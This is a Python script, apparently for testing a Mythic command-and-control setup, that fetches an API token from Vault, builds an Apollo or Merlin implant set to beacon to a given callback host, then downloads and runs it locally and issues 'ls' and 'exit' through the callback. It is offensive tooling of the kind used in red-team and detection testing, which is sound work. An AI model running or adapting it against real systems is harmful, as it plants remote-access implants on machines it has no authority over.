# Mythic C2 Payload Automation Testing
from mythic import mythic_rest
import asyncio
import hvac
import subprocess
import platform
import sys
from sys import argv
import argparse
import warnings

warnings.filterwarnings("ignore")


def my_args(my_argv):
    parser = argparse.ArgumentParser(description="Provide Mythic Server IP, Callback Host and Vault Details to retrieve Mythic Token")
    parser.add_argument("--mythic_server_IP", "-msip", required=True, help="Specify Mythic Server IP")
    parser.add_argument("--mythic_callback_host", "-mch", required=True, help="Specify Mythic Callback Host")
    parser.add_argument("--vault_host", "-vh", required=True, help="Specify Vault Host")
    parser.add_argument("--vault_token", "-vt", required=True, help="Specify Vault Token")
    parser.add_argument("--vault_path", "-vp", default = 'secret/mythic_token', help="Specify Vault Path to retrieve Mythic Token")
    args = parser.parse_args(my_argv[1:])
    return args


def get_vault_secret(vault_addr, secrets_path, token):
    try:
        vault_client = hvac.Client(url=vault_addr, token=token, verify=False)
        vault_response = vault_client.read(secrets_path)
        if 'data' not in vault_response:
            raise KeyError('No data key in the response')
        return vault_response['data']
    except Exception as e:
        print(f'Error accessing Vault: {str(e)}')
        sys.exit(1)



async def scripting():

    args = my_args(argv)
    vault_data = get_vault_secret(args.vault_host, args.vault_path, args.vault_token)

    myth_token = vault_data["mythic_token"]

    mythic = mythic_rest.Mythic(server_ip=args.mythic_server_IP, server_port="443", ssl=True, apitoken=myth_token)

    os_name = platform.system()
    print("Platform is: "+ os_name)

    if os_name == "Windows":

            p =     mythic_rest.Payload (
                    payload_type="apollo", 
                    c2_profiles={
                                "http":[
                                        {"name": "callback_host", "value": args.mythic_callback_host},
                                        {"name": "callback_interval", "value": "4"},
                                        {"name": "callback_port", "value": "80"}
                                        ]
                                    },
                    build_parameters=[
                                {
                                    "name": "output_type", "value": "WinExe"
                                }
                            ],
                    tag=".NET EXE",
                    selected_os="Windows",
                    filename="windowspayload.exe" )
                        
            print("[+] Creating new Windows payload")
            resp = await mythic.create_payload(p, all_commands=True, wait_for_build=True)

            print("[*] Downloading and executing payload")
            
            payload_contents = await mythic.download_payload(resp.response)
            with open("payload.exe", "wb") as f:
                f.write(payload_contents)

            current_directory = os.path.abspath(os.getcwd())
            payload_path = os.path.join(current_directory, "payload.exe")
            p = subprocess.Popen(payload_path)

            await mythic.listen_for_new_callbacks(analyze_callback)

    elif os_name == "Linux":
                    
            p =     mythic_rest.Payload (
                    payload_type="merlin", 
                    c2_profiles={
                                "http":[
                                        {"name": "callback_host", "value": args.mythic_callback_host},
                                        {"name": "callback_interval", "value": "4"},
                                        {"name": "callback_port", "value": "80"}
                                        ]
                                    },
                            build_parameters=[
                                {
                                    "name": "mode", "value": "default"
                                }
                            ],
                    tag="Linux Payload",
                    selected_os="Linux",
                    filename="linuxpayload" )

            print("[+] Creating new Linux payload")
            resp = await mythic.create_payload(p, all_commands=True, wait_for_build=True)

            print("[*] Downloading and executing payload")
    
            payload_contents = await mythic.download_payload(resp.response)
            with open("payload", "wb") as f:
                f.write(payload_contents)

            p = subprocess.Popen('chmod +x payload;./payload',shell=True)

            await mythic.listen_for_new_callbacks(analyze_callback) 
            
    

async def analyze_callback(mythic, callback):
    
    try:
        task = mythic_rest.Task(
            callback=callback, command="ls", params="."
        )
        print("[+] got new callback, issuing command")
        submit = await mythic.create_task(task, return_on="completed")
        print("[*] waiting for command results...")
        
        results = await mythic.gather_task_responses(submit.response.id, timeout=20)
        print(results[0].response)
        
        task2 = mythic_rest.Task(
            callback=callback, command="exit",params="")
        print("[*] Exit Payload")
        await mythic.create_task(task2, return_on="preprocessing" )
        exit(0)
        

    except Exception as e:
        print(str(e))


async def main():
    await scripting()
    
    try:
        while True:
            pending = asyncio.all_tasks()
            plist = []
            for p in pending:
                if p._coro.__name__ != "main" and p._state == "PENDING":
                    plist.append(p)
            if len(plist) == 0:
                exit(0)
            else:
                await asyncio.gather(*pending)
    except KeyboardInterrupt:
        pending = asyncio.all_tasks()
        for t in pending:
            t.cancel()

loop = asyncio.get_event_loop()
loop.run_until_complete(main())

